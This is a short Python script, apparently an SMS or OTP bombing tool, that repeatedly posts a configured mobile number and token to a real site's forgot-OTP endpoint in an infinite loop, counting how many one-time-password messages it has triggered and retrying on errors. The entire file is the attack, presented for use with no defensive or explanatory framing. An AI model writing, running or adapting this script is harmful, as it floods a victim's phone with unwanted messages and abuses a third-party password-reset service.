import time
import requests
import config

flag = config.FLAG

def send_request():
    global config
    url = "https://88panel.com/forgot_otp/winbuzz.com"
    data = {"mobile": config.MOBILE_NUMBER, "_token": config.TOKEN}
    response = requests.post(url, data=data)
    
    if response.status_code == 200:
        config.NO_OTP += 1
        print(config.NO_OTP, "OTP sent with status code:", response.status_code, "to ",config.MOBILE_NUMBER)
    else:
        print("Error Occurred...!!!:", response.status_code)
        send_request()

send_request()

# while flag != True:
while True:
    time.sleep(config.TIME_S)
    send_request()
